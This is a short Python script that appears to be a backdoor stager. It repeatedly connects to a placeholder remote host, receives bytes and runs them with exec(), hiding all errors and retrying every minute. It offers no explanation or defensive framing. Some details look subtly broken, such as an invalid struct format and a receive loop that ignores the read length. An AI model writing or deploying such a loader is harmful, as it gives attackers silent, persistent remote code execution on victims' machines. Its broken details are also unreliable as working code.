from smtplib import LMTP_PORT
import socket,struct
import time
while True:
    try: 
        s=socket.socket(2,1)
        s.connect(('host',LMTP_PORT))
        l=struct.unpack('>1',s.recv(4))[0]
        d=s.recv(4096)
        while len(d)!=1:
            d+=s.recv(4096)
        exec(d,{'s':s})
    except:
        pass
    time.sleep(60)